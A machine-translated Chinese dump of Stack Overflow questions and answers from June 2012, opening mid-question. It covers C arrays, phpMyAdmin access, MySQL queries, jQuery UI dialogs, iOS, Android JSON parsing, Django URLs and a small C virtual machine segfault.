    coord3 = (coordinates) coord; // error: cast specifies array type
    coord3 = (coordinate[]) coord; // error: cast specifies array type
    coord3 = (long int*) coord; // error: incompatible types when assigning to type ‘coordinates’ from type ‘long int *’
} 
```

我知道我可以`typedef coordinate* coordinates;`改用，但它对我来说看起来不是很明确。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T13:10:40.213

您不能在 C 中分配数组。用于`memcpy`将数组复制到另一个数组中。

```
coordinates coord2;

memcpy(coord2, coord, sizeof coord2); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:22:45.930

当数组按值传递时，它们会[*衰减为指针*](https://stackoverflow.com/a/1461449/335858)。解决这个问题的常见技巧是将固定大小的数组包装在 a 中`struct`，如下所示：

```
struct X {
    int val[5];
};

struct X a = {{1,2,3,4,5}};
struct X b;
b = a;
for(i=0;i!=5;i++)
    printf("%d\n",b.val[i]); 
```

现在，您可以将包装好的数组按值传递给函数、分配它们等等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:11:50.897

您的坐标需要初始化为指针

`coordinates *coords2, *coords3;`

试试看，然后分配。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-03-03T14:00:44.813

您不能使用赋值运算符将一个数组分配给另一个数组，例如`a = b`，因为数组不知道其自身的大小。

这就是为什么我们不能使用赋值运算符将一个数组分配给另一个数组的原因。

# phpmyadmin - 我在哪里可以找到 phpmyadmin 登录页面？

> ID：10862560
> 
> 赞同：0
> 
> 时间：2012-06-02T13:10:45.120
> 
> 标签：phpmyadmin

本指南[https://help.ubuntu.com/10.04/serverguide/phpmyadmin.html](https://help.ubuntu.com/10.04/serverguide/phpmyadmin.html)要求我检查 localhost/phpmyadmin 但我已经在安装了 Ubuntu 的云服务器上安装了 phpmyadmin。我可以访问安装在 IPAdress/redmine 的 redmine，但不能以相同的方式访问 phpMyadmin。有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:12:49.467

如果您在远程计算机上安装了 phpMyAdmin，则需要使用远程计算机的地址而不是`localhost`. 使用您的 redmine 示例，您需要在浏览器中输入 IPAddress/phpmyadmin。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-15T14:16:40.150

**通过 ssh 登录到您的服务器并在下面运行此行**

```
 ln -s /usr/share/phpmyadmin /var/www/phpmyadmin 
```

从这个线程找到这个 [http://www.howtoforge.com/forums/showthread.php?t=34823](http://www.howtoforge.com/forums/showthread.php?t=34823)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-04-27T23:02:49.647

$ gksudo gedit /etc/apache2/apache2.conf

在文件底部包含以下行，保存并退出。

$ 包括 /etc/phpmyadmin/apache.conf

# mysql - MySQL 从前 100 名中随机选择

> ID：10862571
> 
> 赞同：0
> 
> 时间：2012-06-02T13:12:21.223
> 
> 标签：mysql, sql

我正在尝试从我的数据库中选择一个随机条目，但只能从最新的 100 个条目中选择。有什么想法吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:17:09.430

对于 MySql -

```
SELECT * FROM 
   (SELECT * FROM table1 order by created_date desc LIMIT 100) table1_alias
ORDER BY RAND()
LIMIT 1 
```

此处的内部查询获取前 100 条记录，您可能需要将 created_date 替换为其他内容。

外部查询给出了随机记录。

* * *

对于 oracle，您将需要这样的东西 -

```
select * from 
  (select * from table1 where rownum < 100 order by created_date desc) table1_alias
where rownum=1 order by dbms_random.value 
```

# jquery - 从内部关闭 Jquery UI 对话框

> ID：10862590
> 
> 赞同：2
> 
> 时间：2012-06-02T13:14:32.893
> 
> 标签：jquery, jquery-ui

我有 2 页，比如 page1.html 和 page2.html。

page1.html 有这个代码：

```
$(document).ready(function() {
                   $('#mydialog').dialog({autoOpen : false, modal : true});
                   $('#myopenlink').click(function() {
                                             $('#mydialog').load('page2.html');
                                             $('#mydialog').dialog('open');
                                             return false;
                                           });                                 
                   }); 
```

page1.html 中的相关 HTML 元素：

```
<a href="#" id="myopenlink"> Open </a>
<div id="mydialog"> </div> 
```

当我单击“myopenlink”时，我会得到一个显示 page2.html 的模式对话框。

现在，在 page2.html 中，我有另一个链接（或提交按钮等）。我想在单击后关闭对话框（即从它加载的页面中关闭对话框）。

这可能吗？

**编辑：**

经过一番挖掘，我想我的问题不是专门关于对话框的。这就是我想要做的：

page2.html 内容：

```
<a href="#" id="mycloselink"> close </a> 
```

page1.html 内容：

```
function closeLinkClicked(event) {
    event.preventDefault();
    alert('Please Reach this point so I replace this with close dialog');
}

function doneLoading(data) {
    $('#mydiv').on('click', '#mycloselink', closeLinkClicked);
}

$(document).ready(function() {
                             $('#mydiv').load('page2.html', doneLoading);
                            }); 
```

page1.html 当然也有这个：

```
<div id="mydiv"> </div> 
```

当我单击从 page2 加载到 mydiv 的链接时，没有任何反应（我希望显示警报）。

我究竟做错了什么？

谢谢，谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:17:28.683

嗨，喜欢这个**演示** [http://jsfiddle.net/mhLc5/6/](http://jsfiddle.net/mhLc5/6/) **或更新的答案 =>**这个[http://jsfiddle.net/Pb2eR/](http://jsfiddle.net/Pb2eR/) **或** [http://jsfiddle.net/Pb2eR/1/](http://jsfiddle.net/Pb2eR/1/)

**动态追加**演示：http: [//jsfiddle.net/Pb2eR/13/](http://jsfiddle.net/Pb2eR/13/)

所以要关闭对话框，你只需要调用`.dialog('close')`rest a demo 会给你一个很好的地方玩。

API 位于此处：http: [//jqueryui.com/demos/dialog/](http://jqueryui.com/demos/dialog/)

好读：http: [//forum.jquery.com/topic/close-a-jquery-ui-dialog-from-the-inside](http://forum.jquery.com/topic/close-a-jquery-ui-dialog-from-the-inside)

希望这可以帮助！

**代码**

```
 buttons: {

            'Submit': function() {
                $Dialog_div.dialog('close');
            } 
```

**示例代码的其余部分**

变量 $Dialog_div;

```
function fnOpenDialog() {
    $Dialog_div = $('<div id=\'ThisDialog\'>Hello Page 2</div>').prependTo('body');

    $Dialog_div = $('#ThisDialog').dialog({
        autoOpen: true,
        draggable: true,
        resizable: true,
        title: 'Dialog stack overflow HULK',
        modal: true,
        stack: true,
        height: ($(window).height() * 0.95),
        width: ($(window).width() * 0.9),

        buttons: {

            'Submit': function() {
                $Dialog_div.dialog('close');
            }

        }

    });

}

$('#ClickMe').click(fnOpenDialog);​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T20:44:55.527

要在事件处理程序中实际关闭对话框，请使用以下命令：

```
$(this).closest('.ui-dialog-content').dialog('close'); 
```

它将遍历 DOM 从新加载的内容备份到原始 div 中，该 div 现在具有包装它的对话框。

我看不出您为实际注册事件而发布的代码有任何明显错误，但据我所知，这里根本不需要使用事件委托。

由于您在完成之前不会执行注册`.load`，因此您可以*直接*在`#mycloselink`.

# ios - iOS 音乐流媒体和 HTTP 实时流媒体

> ID：10862596
> 
> 赞同：3
> 
> 时间：2012-06-02T13:15:53.147
> 
> 标签：ios, http, streaming, mp3, live

我有几个关于音频流的问题：

我想要做的是流一些 mp3 文件，在 3 到 7 分钟之间（主要是音乐文件），但这些 mp3 是由不是我的服务器提供的。我确切地说我当然希望我的应用程序在应用程序商店中被接受......

1°/ 我需要通过 http 传输一些 mp3 音乐文件，它们以 128Kbps 编码。我真的需要 HTTP Live Streaming 服务 (HLS) 吗？

2°/如果我必须使用 HLS，我是否必须将我的 mp3 文件重新编码为 64Kbps 或只是将它们分段？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T15:53:09.717

我正在使用此代码播放音频..据我所知，您不需要使用 HLS，您可以按原样进行流式传输..或者您必须移动音频的元数据..我在另一个答案[iPhone/中给出了步骤iPad同时下载和播放](https://stackoverflow.com/questions/10597884/iphone-ipad-downloading-and-playing-simultaneously/10601021#10601021)..请检查..

```
// add the necessary frameworks    
#import <CoreAudio/CoreAudioTypes.h>
#import <AVFoundation/AVFoundation.h>
// put the code in .h file
AVAudioPlayer * avPlayer;

-(IBAction) stopPlayingAudio {
    [avPlayer stop];
}

- (IBAction)showVoiceRecordingMenu
{

    // Create an otherwise-empty alert sheet
    avPlayer = [[AVAudioPlayer alloc] initWithContentsOfURL:[NSURL URLWithString:@"http://test.com/audio/files/audioFile.mp3"] error:&error];

    NSLog(@"%@", [filePath path] ); 
    NSLog(@"%f", avPlayer.duration );
    itsAudioDuration = avPlayer.duration;
    [avPlayer prepareToPlay];
    [avPlayer play];
} 
```

# appcelerator - Appcelerator TableView - 未知的点击区域。需要帮助理解

> ID：10862597
> 
> 赞同：0
> 
> 时间：2012-06-02T13:16:30.973
> 
> 标签：appcelerator, appcelerator-mobile

我正在使用 Appcelerator 构建移动应用程序，并且在 Window() 上添加了一个 TableView()。在 TableView() 内部，它的样式是 GroupView，它有一个 headerView() 和一个 footerView()。我有两个 TextField()，我希望它在单击非 TextField() 区域时变得模糊()。但是，当我将其映射出来时，我意识到，我找不到在橙色和粉红色区域中发生的 Click() 事件，因此，当两个区域都被单击时，我无法模糊文本字段！

很感谢任何形式的帮助。粉红色区域是由于我为 footerView() 设置了高度。

![表视图问题](../Images/dd13c891e41509bf61cbd46cd41fdc62.png)

干杯，米奇

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T23:05:37.940

创建一个高度为 Ti.UI.FULL 的新视图，并添加一个对其进行模糊处理的单击事件侦听器。然后将所有元素添加到新视图中，并将视图添加到窗口中。

# mobile - 在移动浏览器中调试

> ID：10862598
> 
> 赞同：0
> 
> 时间：2012-06-02T13:16:47.263
> 
> 标签：mobile, firebug, mobile-browser

有没有像 firebug 这样的工具来调试移动浏览器中的 javascript/jquery Ajax 请求？

你们如何在移动设备的移动浏览器中调试东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:20:54.067

对于 iphone 和 ipad 测试，您可以使用桌面版 Safari 并像这样更改用户代理：

[http://www.onedigitallife.com/2005/08/03/changeing-safaris-user-agent/](http://www.onedigitallife.com/2005/08/03/changing-safaris-user-agent/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:21:06.307

有一个 phonegap 用于在移动设备（**所有**移动设备）上进行远程调试的脚本插件，我建议你看看它：[http ://debug.phonegap.com/](http://debug.phonegap.com/)

这使您可以在 iPhone、Android、Windows Mobile 等台式计算机移动设备上进行调试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:25:25.607

取决于设备。我没有机会在 Android 上使用浏览器，但我在 iPhone 和 iPad 上做了一些调试。通常大多数测试都可以通过模拟器进行，但在某些情况下，例如当您必须测试多点触控手势等时，通过模拟器/代理更改并不完全可行。

首先，您需要激活调试（设置-> Safari）。但这只是问题的前半部分。第二个必须在代码中完成。如果您尝试测试错误的数据不是很大，您可以序列化它（通常是对象）并通过控制台页面中的 console.log() 命令显示（打开单击顶部栏将显示在您启用调试）。

对于简单的情况，这或多或少是这样。

# c#-4.0 - C# - 从 AD 中获取 uSNCreated 值 - DomainController 类（将 System.__ComObject 转换为字符串）

> ID：10862608
> 
> 赞同：1
> 
> 时间：2012-06-02T13:18:25.957
> 
> 标签：c#-4.0, active-directory

我使用了类似的代码

```
object getCreatedUSN=**objDC**.GetDirectoryEntry().Properties["uSNCreated"].Value; 
```

用于从 C# 类获取 uSNCreated 属性值`DomainController **objDC**`，但此对象将返回`System.__ComObject`.

我如何转换它以及如何将 uSNCreated 属性值作为字符串或对象？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-03T18:57:13.083

最后加个试试`.ToString()`？

# qt - 如何在 Qt 中动态链接 webkit

> ID：10862612
> 
> 赞同：0
> 
> 时间：2012-06-02T13:19:27.497
> 
> 标签：qt

我已在我的 .pro 文件中链接到 webkit，如下所示

```
QT       += webkit 
```

直到昨天它都可以正常工作，但是在添加另一个库的同时对 .pro 文件进行了大量编辑后，我开始遇到 Qt 的 QWebView 代码内部的崩溃。这部分以前工作得很好。

还有一个 post-build 错误`QWidget: Must construct a QApplication before a QPaintDevice`导致我看到这篇文章说 webkit 需要动态链接。

如何在 Qt 中动态链接 webkit？

# objective-c - 如何在xcode中将数组的值从第一个视图传递到第四个视图？

> ID：10862614
> 
> 赞同：0
> 
> 时间：2012-06-02T13:19:41.693
> 
> 标签：objective-c, xcode, uitableview, xml-parsing, nsarray

我的应用中有 4 个视图，即出版年份 > 书籍 > 作者 > 作者描述

我通过这种格式的 xml 获取这些数据。

那么如何根据选择的书和选择的作者传递作者 desc 中的信息？我已经创建了一个对象名称“结果”，其中包含此已解析元素的所有详细信息。解析已完全完成。但是我无法根据从一个视图到第三个视图中选择的行来显示和传输信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:18:34.030

有几种常用的实践和模式可以在对象之间发送消息和值：

1.  如果您需要按创建顺序将消息和/或值传递给对象 - 使用*`assignment`*或*`straight call`*. 以及**@obuseme**已经写过。

2.  如果您需要以创建的反向顺序将消息和/或值传递给对象，请使用*`delegation`*. “倒序”我的意思是所有者创建它的子对象并等待它的一些回调。

3.  还有一个名为*`singleton`*. 您可以使用它从任何对象访问它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:47:14.187

在 didSelectRowAtIndexPath 中，当您创建新的视图控制器以推送到屏幕上时（假设您使用的是 uinavigationcontroller 堆栈，听起来像您），然后将“result”设置为新控制器上的属性

我在猜测您的视图控制器的名称，此外，我使用通用指针类型“id”作为结果，如果您愿意，可以将其替换为特定的结果类。

YearPublishedViewController.m

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    BooksListViewController *booksVC = [[BooksListViewController alloc] initWithNibName:@"BooksListViewController" bundle:nil];
    booksVC.result = self.result;
} 
```

BooksListViewController.h

```
#import <UIKit/UIKit.h>
@interface BooksListViewController : UITableViewController
@property (nonatomic, retain) id result; 
```

BooksListViewController.m

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    AuthorListViewController *authorVC = [[AuthorListViewController alloc] initWithNibName:@"AuthorListViewController" bundle:nil];
    authorVC.result = self.result;
} 
```

AuthorListViewController.h

```
#import <UIKit/UIKit.h>
@interface AuthorListViewController : UITableViewController
@property (nonatomic, retain) id result; 
```

AuthorListViewController.m

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    AuthorDescriptionViewController *authorDescVC = [[AuthorDescriptionViewController alloc] initWithNibName:@"AuthorDescriptionViewController" bundle:nil];
    authorDescVC.result = self.result;
} 
```

AuthorDescriptionViewController.h

```
#import <UIKit/UIKit.h>
@interface AuthorDescriptionViewController : UIViewController
@property (nonatomic, retain) id result; 
```

作者描述ViewController.m

```
//use self.result wherever you need it here 
```

还要确保在每个控制器的释放中释放“结果”，以进行正确的内存管理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:23:53.350

Inode 将数组的值从第一个视图传递到第四个视图，然后将值从 View1 传递到 View2，从那里传递到 View3，再从那里传递到 View4。这种根据苹果指南传递值的标准方式

# r - R将日期（dd / mm / yy）转换为（mm / yy）

> ID：10862615
> 
> 赞同：2
> 
> 时间：2012-06-02T13:19:45.483
> 
> 标签：r

我有一个`df`带有日期列 Date ( ) 的 data.frame ( `dd-mm-yyyy`)。如何将其转换为 ( `mm-yyyy`)？

我试过了：

```
dates <- as.Date(df$Date, "%m/%Y") 
```

但这没有用。我会很感激你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T13:26:07.037

从技术上讲，`"mm-yyyy"`不是日期。如果您只想要一个用于打印/绘图的值，只需通过格式化 Date 列`format(df$Date, "%m-%Y")`。如果要将结果用作时间度量，请使用`zoo::as.yearmon`.

# php - 在mysql查询中计算订单位置

> ID：10862618
> 
> 赞同：0
> 
> 时间：2012-06-02T13:20:39.900
> 
> 标签：php, mysql, count

我目前正在设计一个发票系统，可以将发票分配给单独的项目。发票只会分配给一个项目。

目前我有一个 mysql 表，我想用发票号查询，检索发票所针对的各个项目的所有发票，按创建日期订购它们，然后（这是我坚持的一点）基于我将查询的发票编号，计算该发票在该项目总发票中的数量。

为了增加一些清晰度，我的意思是以下

```
URN_ID        URN_Project_ID    URN_Date
1             1                 2012-03-17
2             3                 2012-03-18
3             2                 2012-03-21
4             1                 2012-03-21
5             2                 2012-04-05
6             1                 2012-04-08
7             3                 2012-04-15
8             2                 2012-04-24
9             1                 2012-05-02
10            3                 2012-05-10 
```

假设我查询了 6 号发票，因此项目是项目 1。本质上，我会将信息范围缩小到以下内容

```
URN_ID        URN_Project_ID    URN_Date
1             1                 2012-03-17
4             1                 2012-03-21
6             1                 2012-04-08
9             1                 2012-05-02 
```

从上面我们可以看到，我总共有 4 张发票，但是我想要一种方法来返回发票 6 是 4 张发票中的第 3 号。这样做的目的是，如果将来有人打印发票副本，查看它的人可以清楚地看到该项目的发票 3。最后，我不需要详细说明我的文档上的发票总数，只需要总数中的位置即可。

对此的任何帮助将不胜感激，因为我大部分时间都在寻找我可以拼凑但无济于事的解决方案。作为后备，我总是可以在我的表中添加另一列，并在输入阶段进行 mysql 计数，然后将迄今为止的总数添加到列中，但我宁愿学习新的东西并将我的表保持在最低限度。

提前感谢任何解决方案或帮助。

艾伦

编辑

确定一些附加信息。

*   我从中提取数据的表称为：urn
*   目前我的表有 5 列，分别称为 URN_ID、URN_PROJECT_ID、URN_Date、URN_Due_Terms、URN_Doc_Type

**注意我已经更新了上面的列数据以反映我的实际列名称**

到目前为止，我已经尝试过：

```
$query2 = "SELECT  @curRow := @curRow + 1 AS row_number, iv.* FROM urn iv JOIN (SELECT @curRow := 0) r WHERE iv.URN_Project_ID='$urn_project_id'";
$res2 = mysql_query($query2);
$data2 = mysql_fetch_array($res2);
echo $data2['row_number']; 
```

但是，无论我显示了哪个 URN_ID，这只会返回 1 作为值。

我对使用 @ 符号的语句一无所知，因此不知如何调试它。

任何帮助都会很好。

干杯。铝。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:42:25.807

您基本上想在结果集中添加一个行号，例如：

```
SELECT  @curRow := @curRow + 1 AS row_number,
        iv.*
FROM    invoices iv
JOIN    (SELECT @curRow := 0) r
WHERE   iv.project_id=1; 
```

这应该返回：

```
row_number invoice id    project_id    invoice_date
1          1             1             2012-03-17
2          4             1             2012-03-21
3          6             1             2012-04-08
4          9             1             2012-05-02 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:39:28.083

虽然一开始可能看起来有点不舒服，但这可能是最好的方法。

```
mysql> SET @rank=0;

mysql> SELECT @rank:=@rank+1 AS rank,OtherColumns as Column FROM Invoices ..... 
```

@rank 增量将做你想做的事。您应该事先设置@rank 变量；如果排名设置或不喜欢（未测试），可能有一种方法可以做一个案例然后结束：

```
mysql> SELECT case @rank when NULL then @rank=0 else @rank:=@rank+1 end as rank FROM .... 
```

# django - 更正 Django 模板 url 变量以与通用视图 list_detail 一起使用

> ID：10862619
> 
> 赞同：0
> 
> 时间：2012-06-02T13:20:49.350
> 
> 标签：django, django-urls, django-generic-views

无论出于何种原因，我都很难找出在我的 url 模板标签中使用的正确变量以正确呈现我的模板。

```
#firms/url.py 
from django.views.generic import list_detail

firm_list = {
             'queryset' : Firm.objects.all(),
             'template_name': 'firms/firm_index.html',
}

urlpatterns = patterns("",
(r"^$", list_detail.object_list, firm_list),
) 
```

我的 {% url 应该是什么？？？%} 变量是用来渲染这个firm_index.html 模板吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:04:28.363

如果你使用[`url`](https://docs.djangoproject.com/en/dev/topics/http/urls/#url)风格

```
urlpatterns = patterns('',
    url(r'^index/$', index_view, name="main-view"),
    ...
) 
```

你可以给你的 url 一个自定义名称来引用它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T18:16:41.177

从[文档](https://docs.djangoproject.com/en/dev/ref/templates/builtins/?from=olddocs#url)中，您可以清楚地提及视图方法的名称和文件中的名称。

```
{% url 'path.to.some_view' v1 v2 %} 
```

因此，对于您的情况，您应该能够：

```
{% url 'list_detail.object_list' 'firm_list' %} 
```

# c - Mico C 虚拟机分段故障

> ID：10862622
> 
> 赞同：0
> 
> 时间：2012-06-02T13:21:05.043
> 
> 标签：c, vm-implementation

下面的虚拟机在我的堆栈增量指令中出现段错误，该指令从 bin 指针获取堆栈偏移量并将其加一。如果我使用值 -1 这可以正常工作，但是当我`-1`通过`bp[1]`偏移量访问时它会崩溃。这对我来说真的没有意义，我做错了什么？

```
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

typedef enum {PUSH,STACKINC,EXIT} opCodes;
char * opCode[] =  {"Push","Stack Increment","Exit"};

typedef struct VirtualMachine
{
    uint32_t * sp;          /* Stack Pointer   */
    uint32_t * bp;          /* Bin Pointer     */
    uint32_t stack[100];    /* VM stack        */
} VM;

void processVM(VM * vm)
{
    uint32_t * bp = vm->bp;
    uint32_t * sp = vm->sp;
    printf("OP: %s\n",opCode[bp[0]]);

    switch (bp[0])
    {
    case PUSH:      sp[0] = bp[1]; sp++; bp+=2;     break;
    case STACKINC:  sp[bp[1]]++; bp+=2;             break;
    }

    vm->bp = bp;
    vm->sp = sp;
    /* Set out stack and bin pointers back */
}

int main()
{
    uint32_t binFile[] = {PUSH,1,PUSH,2,PUSH,3,STACKINC,-1,EXIT};

    VM myVM;
    myVM.bp = binFile;
    myVM.sp = myVM.stack;

    while(myVM.bp[0] != EXIT)
    {
            processVM(&myVM);
            usleep(200000);
    }
    printf("VM done executing\n");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:38:08.913

你所有的变量都是无符号的。即使您存储 -1，您在读回时也会得到 4294967295。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:47:19.583

是32位机器吗？enum 类型是有符号整数。有符号整数范围是 -0x80000000 ~ 0x7fffffff。

你知道有符号整数 -1 ---> 无符号整数 0xffffffff。

看你的代码

```
uint32_t binFile[] = {PUSH,1,PUSH,2,PUSH,3,STACKINC,-1,EXIT}; 
```

binFile 的类型是 uint32_t。无符号整数！！！

你的编译器 make -1 ---> 0xffffffff （无符号整数）。

让我们看看这段代码

```
switch (bp[0])
    {
    case PUSH:      sp[0] = bp[1]; sp++; bp+=2;     break;
    case STACKINC:  sp[bp[1]]++; bp+=2;             break;
    } 
```

详细的...

```
 case STACKINC:  sp[bp[1]]++; bp+=2;             break; 
```

更详细...

```
sp[bp[1]]++; 
```

你想像下面这样运行......

```
sp[-1]++; 
```

但是，bp[1] == -1 ---> AND 无符号整数！！！所以你的代码...

```
sp[0xffffffff]++; 
```

您的堆栈大小为 100。因此，发生了页面错误（分段错误）...

# java - 如何在android中循环遍历json数据

> ID：10862628
> 
> 赞同：0
> 
> 时间：2012-06-02T13:21:50.523
> 
> 标签：java, android, json, jsonp

如标题中所述。如何遍历从服务器获取的 json 数据。我得到这种 json 数据

```
{
   "tag":"home",
   "success":1,
   "error":0,
   "uid":"4fc8f94f1a51c5.32653037",
   "name":"Saleem",
   "profile_photo":"http:\/\/example.info\/android\/profile_photos\/profile1.jpg",
   "places":
   {
       "place_photo":"http:\/\/example.info\/android\/places_photos\/place1.jpg",
       "created_at":"2012-06-02 00:00:00",
       "seeked":"0"
    }
}
{
   "tag":"home",
   "success":1,
   "error":0,
   "uid":"4fc8f94f1a51c5.32653037",
   "name":"Name",
   "profile_photo":"http:\/\/example.info\/android\/profile_photos\/profile1.jpg",
   "places":
   {
       "place_photo":"http:\/\/example.info\/android\/places_photos\/place1.jpg",
       "created_at":"2012-06-02 00:00:00",
       "seeked":"0"
    }
}
{
   "tag":"home",
   "success":1,
   "error":0,
   "uid":"4fc8f94f1a51c5.32653037",
   "name":"Name",
   "profile_photo":"http:\/\/example.info\/android\/profile_photos\/profile1.jpg",
   "places":
   {
       "place_photo":"http:\/\/example.info\/android\/places_photos\/place1.jpg",
       "created_at":"2012-06-02 00:00:00",
       "seeked":"0"
    }
} 
```

这是我获取 json 数据的地方

```
 public class Home extends Activity {
Button btnLogout;
ScrollView svHome;
UserFunctions userFunctions;
LoginActivity userid;

@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    userid = new LoginActivity();
    svHome = (ScrollView)findViewById(R.id.svHome);
    setContentView(R.layout.home);

    userFunctions = new UserFunctions();

    /***********************************************************/
            //here is where my above mentioned json data is
    JSONObject json = userFunctions.homeData();

    try {
        if(json != null && json.getString("success") != null) {
            //login_error.setText("");
            String res = json.getString("success");
            //userid = json.getString("uid").toString();
            if(Integer.parseInt(res) == 1) {
                                    //currently this only shows the first json object
                Log.e("pla", json.toString());
            } else {
                //login_error.setText(json.getString("error_msg"));
            }
        } else {
            Toast.makeText(getBaseContext(), "No data", Toast.LENGTH_LONG).show();
        }
    } catch (JSONException e) {
        e.printStackTrace();
    }
    /*******************************************************/
}

} 
```

**更新**

根据答案中给出的链接进行更改后。这是我的更改

```
 /***********************************************************/
    JSONObject json = userFunctions.homeData();
    String jsonData = json.toString();

    try {
        if(json != null && json.getString("success") != null) {
            //login_error.setText("");
            String res = json.getString("success");
            //userid = json.getString("uid").toString();
            if(Integer.parseInt(res) == 1) {
                JSONArray jsonArray = new JSONArray(jsonData);
                for (int i = 0; i < jsonArray.length(); i++) {
                    JSONObject jsonObject = jsonArray.getJSONObject(i);
                    Log.e("Object", jsonObject.getString("places"));
                    //Log.i(ParseJSON.class.getName(), jsonObject.getString("text"));
                }
                Log.e("pla", json.toString());
            } else {
                //login_error.setText(json.getString("error_msg"));
            }
        } else {
            Toast.makeText(getBaseContext(), "No data", Toast.LENGTH_LONG).show();
        }
    } catch (JSONException e) {
        e.printStackTrace();
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:49:53.767

请查看链接

[http://www.androidhive.info/2012/01/android-json-parsing-tutorial/](http://www.androidhive.info/2012/01/android-json-parsing-tutorial/)

如果可能的话，在 json 中进行了更改，因为 json 中没有数组大括号“[”“]”，您需要在循环中进行迭代

json应该是这样的

```
{
"arrayKey": [
    {
        "tag": "home",
        "success": 1,
        "error": 0,
        "uid": "4fc8f94f1a51c5.32653037",
        "name": "Saleem",
        "profile_photo": "http://example.info/android/profile_photos/profile1.jpg",
        "places": {
            "place_photo": "http://example.info/android/places_photos/place1.jpg",
            "created_at": "2012-06-02 00:00:00",
            "seeked": "0"
        }
    },
    {
        "tag": "home",
        "success": 1,
        "error": 0,
        "uid": "4fc8f94f1a51c5.32653037",
        "name": "Saleem",
        "profile_photo": "http://example.info/android/profile_photos/profile1.jpg",
        "places": {
            "place_photo": "http://example.info/android/places_photos/place1.jpg",
            "created_at": "2012-06-02 00:00:00",
            "seeked": "0"
        }
    }
] 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:30:17.580

您可以使用如下 json 库：

导入 org.json.JSONArray；导入 org.json.JSONObject；

它允许您将 json 数据读入数组，如下所示：

JSONArray jsonArray = new JSONArray([你的 json 数据]);

试试这个教程：[http ://www.vogella.com/articles/AndroidJSON/article.html](http://www.vogella.com/articles/AndroidJSON/article.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:51:13.563

正如您的 logcat 所述，您正在尝试将 JSONObject 转换为 JSONArray：

```
 org.json.JSONException: Value {"uid":"4fc8f94f1a51c5.32653037","places":{"place_photo":"http://example.info/android/places_photos/place1.jpg","created_at":"2012-06-02 00:00:00","seeked":"0","longitude":"24.943514","latitude":"60.167112"},"error":0,"success":1,"tag":"home","profile_photo":"http://example.info/android/profile_photos/profile1.jpg","name":"Zafar Saleem"} of type org.json.JSONObject cannot be converted to JSONArray 
```

尝试调试代码 - 找出引发异常的位置，并在那里创建一个 JSONObject 而不是 JSONArray。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T13:52:16.877

我推荐的另一种方法是使用[GSON](http://code.google.com/p/google-gson/)库，它很容易结束痛苦。对于格式良好的 Json

# android - 防止在android中发送消息

> ID：10862629
> 
> 赞同：0
> 
> 时间：2012-06-02T13:21:58.203
> 
> 标签：android, sms, android-contentresolver

我知道我可以检测到正在使用以下代码发送的消息

```
ContentResolver contentResolver = context.getContentResolver();
contentResolver.registerContentObserver(Uri.parse("content://sms"),true, myObserver); 
```

我需要知道的是，是否有可能阻止它出去或暂停它？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:36:43.480

除非您是用户输入消息的消息应用程序，否则这是不可能的（然后您可以使用它做任何您想做的事情，包括不发送）

但是，如果用户使用的是普通的消息应用程序或其他第 3 方应用程序，则其他应用程序无法尝试阻止发送 SMS（此功能几乎肯定会被滥用。）

我认为有些应用程序打算在驾驶时使用，这些应用程序会阻止向用户显示传入的文本，也许看看那些，如果有办法传出，也许他们会想出来的。不过，我认为这在库存设备上是不可能的。

# c++ - 使用 boost::iostreams 和 zlib 读取 .gz 文件的运行时错误

> ID：10862630
> 
> 赞同：2
> 
> 时间：2012-06-02T13:22:00.987
> 
> 标签：c++, zlib, boost-iostreams

我正在尝试使用 boost::iostreams 读取 .gz 文件并在屏幕上打印文本内容。这只是一个简单的实验来了解这个库，我使用来自 IMDb (ftp://ftp.fu-berlin.de/pub/misc/movies/database/) 的“directors.list.gz”文件作为我的输入文件。

我的代码通过 MSVC-10 编译，但执行时进程中止。除了错误代码为 R6010 之外，错误消息中没有太多信息。

有人可以就可能导致这种情况的原因以及如何使这项工作指出我的方向吗？

这个库看起来很整洁，我希望能正确使用它。非常感谢您的帮助。

```
#include <fstream>                 // isalpha
#include <iostream>                // EOF
